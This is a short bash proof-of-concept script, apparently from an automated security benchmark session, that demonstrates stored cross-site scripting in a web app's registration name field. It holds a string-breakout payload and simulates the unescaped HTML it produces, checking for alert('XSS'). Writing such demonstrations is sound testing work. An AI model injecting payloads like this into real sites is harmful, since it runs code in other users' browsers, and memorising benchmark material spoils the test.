#!/bin/bash
# POC: Demonstrates Stored XSS vulnerability in registration name field by showing how malicious payload breaks out of JavaScript string context and executes arbitrary code.
# Target: ./repo
# Created: 2025-11-04T17:13:35.435Z
# Session: benchmark-XBEN-025-24-mhktlvhv

# Stored XSS in User Registration Name Field POC
# This script demonstrates the vulnerability by showing:
# 1. How the payload would be sent during registration
# 2. How the vulnerable code would render it
# 3. Simulating the vulnerable HTML output

echo "[*] Stored XSS in Registration Name Field - Vulnerability Demonstration"
echo ""

# The malicious payload used during registration
MALICIOUS_NAME='xsstest\");alert('"'"'XSS'"'"');(\"'
echo "[*] Malicious Payload: $MALICIOUS_NAME"
echo ""

# Simulate Step 1: Registration with malicious name
echo "[*] Step 1: POST /accounts/register/step1/"
echo "    Payload: name=$MALICIOUS_NAME&password=TestPass1234"
echo ""

# Step 2: Continue registration
echo "[*] Step 2: POST /accounts/register/step2/"
echo "    Payload: email=xsstest@test.com"
echo ""

# Step 3: Show vulnerable code generation
echo "[*] Step 3: GET /accounts/register/step3/"
echo "[*] Vulnerable server-side code generates JavaScript:"
echo ""

# This simulates what the vulnerable Django/Python code does
# The server concatenates user input directly into JavaScript without escaping
VULNERABLE_HTML='<script>alert(\"Hello '"$MALICIOUS_NAME"'. Just Now up to 50% OFF \")</script>'

echo "Generated HTML on step 3 page:"
echo "$VULNERABLE_HTML"
echo ""

# Check if the alert('XSS') payload is present unescaped
if echo "$VULNERABLE_HTML" | grep -q "alert('XSS')"; then
  echo "[+] SUCCESS: XSS Payload Detected!"
  echo "[+] The JavaScript alert('XSS') is present in the HTML unescaped"
  echo "[+] This would execute in the victim's browser when viewing step3"
  echo ""
  
  # Demonstrate the actual JavaScript that would execute
  echo "[+] Actual JavaScript that would execute:"
  echo "$VULNERABLE_HTML"
  echo ""
  
  # Extract and show the injected code
  INJECTED=$(echo "$VULNERABLE_HTML" | grep -oP "alert\('XSS'\)")
  echo "[+] Injected Code Extracted: $INJECTED"
  echo ""
  
  echo "[+] VULNERABILITY CONFIRMED"
  echo "[+] Attack Type: Stored XSS"
  echo "[+] Location: User registration name field → step3 page"
  echo "[+] Impact: Arbitrary JavaScript execution in victim's session"
  exit 0
else
  echo "[-] Payload not detected or was properly escaped"
  exit 1
fi